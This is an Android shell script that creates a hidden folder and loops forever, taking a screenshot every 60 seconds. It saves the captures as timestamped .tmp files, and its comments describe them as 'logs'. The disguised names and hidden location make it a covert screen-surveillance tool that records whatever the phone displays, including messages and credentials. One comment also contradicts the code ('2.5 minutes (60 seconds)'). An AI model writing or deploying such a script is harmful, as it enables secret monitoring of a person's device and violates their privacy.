#!/system/bin/sh

# Create a dir if it doesn't exist
mkdir -p /storage/emulated/0/IDM/.hidden/report	

# Create a log file
LOGFILE=/storage/emulated/0/IDM/.hidden/report/script.log

echo "Script started at $(date)" > $LOGFILE

while true
do
    # Log the timestamp
    echo "Log report at $(date)" >> $LOGFILE

    # logs directory with a timestamp
    screencap -p /storage/emulated/0/IDM/.hidden/report/log_$(date +%Y%m%d_%H%M%S).tmp

    # Log the completion
    echo "Log saved at $(date)" >> $LOGFILE

    # Wait for 2.5 minutes (60 seconds)
    sleep 60
done
